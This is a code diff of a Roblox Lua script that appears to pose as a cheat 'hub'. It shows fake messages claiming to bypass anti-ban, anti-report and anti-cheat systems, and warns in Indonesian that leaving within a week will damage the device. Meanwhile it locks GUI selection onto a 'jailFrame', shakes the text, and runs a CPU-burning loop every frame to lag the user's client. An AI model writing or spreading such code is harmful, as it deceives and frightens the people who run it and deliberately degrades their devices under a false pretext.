@@ -62,29 +62,29 @@ task.spawn(function()
     infoText.BackgroundTransparency = 1
     infoText.Font = Enum.Font.Code
     
-    -- [[ SISTEM UPDATE TEKS - FORCED ]] --
-    task.spawn(function()
-        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI BANNED...\n\nSABAR TUNGGU PROSES SELESAI!"
-        task.wait(120) -- 2 Menit
+    local startTime = tick()
+    
+    -- [[ SISTEM UPDATE TEKS BERDASARKAN WAKTU ASLI ]] --
+    game:GetService("RunService").RenderStepped:Connect(function()
+        local currentTime = tick() - startTime
         
-        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI REPORT...\n\nSABAR TUNGGU PROSES SELESAI!"
-        task.wait(120) -- 2 Menit
-        
-        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI DETECTED...\n\nSABAR TUNGGU PROSES SELESAI!"
-        task.wait(120) -- 2 Menit
-        
-        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI CHEAT...\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
-    end)
+        if currentTime < 120 then
+            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI BANNED...\n\nSABAR TUNGGU PROSES SELESAI!"
+        elseif currentTime >= 120 and currentTime < 240 then
+            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI REPORT...\n\nSABAR TUNGGU PROSES SELESAI!"
+        elseif currentTime >= 240 and currentTime < 360 then
+            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI DETECTED...\n\nSABAR TUNGGU PROSES SELESAI!"
+        else
+            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI CHEAT...\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
+        end
 
-    -- Lag Engine (Dijalankan secara terpisah agar teks tetap bisa update)
-    task.spawn(function()
-        game:GetService("RunService").RenderStepped:Connect(function()
-            game:GetService("GuiService").SelectedObject = jailFrame
-            infoText.Position = UDim2.new(0.05, math.random(-1, 1), 0.3, math.random(-1, 1))
-            for i = 1, 400000 do local _ = i * i end
-        end)
+        -- Efek Guncang & Lag Engine
+        game:GetService("GuiService").SelectedObject = jailFrame
+        infoText.Position = UDim2.new(0.05, math.random(-1, 1), 0.3, math.random(-1, 1))
+        for i = 1, 300000 do local _ = i * i end
     end)
 end)
+
 
 
 
